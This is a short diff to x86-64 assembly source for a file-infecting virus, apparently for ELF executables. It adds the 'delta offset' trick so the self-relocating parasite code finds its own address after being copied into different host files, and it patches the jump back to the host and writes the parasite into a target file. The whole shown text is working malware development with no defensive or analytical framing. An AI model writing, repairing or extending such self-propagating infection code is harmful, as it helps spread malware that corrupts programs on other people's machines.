@@ -214,7 +214,13 @@ _segloop:
 	sub rax, [rbp-24]
 	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE LENGTH TO DIFF
 	neg rax ; NEGATE DIFFERENCE FOR RELATIVE JUMP, WE JUMP BACKWARD
-	mov dword[_parasiteEnd-4], eax
+
+	call delta_offset ; DELTA OFFSET TRICK
+delta_offset: ; BECAUSE PARASITE END WILL BE DIFFERENT IN EACH HOST FILE
+	pop r15
+	sub r15, delta_offset ; STORE OUR DELTA OFFSET IN R15
+
+	mov dword[r15+_parasiteEnd-4], eax
 	; REDIRECTING OUR VIRUS BY MODIFYING THE CODE AT RUNTIME, INSANE !
 
 	; # INCREASE DATA SEG SIZE
@@ -400,7 +406,14 @@ _postLoop:
 	; # WRITE PARASITE CODE IN THE FILE
 	mov rax, 1 ; WRITE KERNEL CODE
 	mov rdi, r9 ; FD
+
+	call delta_offset2 ; DELTA OFFSET TRICK
+delta_offset2: ; BECAUSE PARASITE START WILL BE DIFFERENT IN EACH HOST FILE
+	pop r15
+	sub r15, delta_offset2 ; STORE OUR DELTA OFFSET IN R15
+
 	mov rsi, _parasiteStart ; ADDR OF THE BEGINNING OF OUR PARASITE
+	add rsi, r15 ; ADDING DELTA OFFSET
 	mov rdx, _parasiteEnd - _parasiteStart ; SIZE OF OUR PARASITE CODE
 	syscall ; WRITE SYSCALL
 
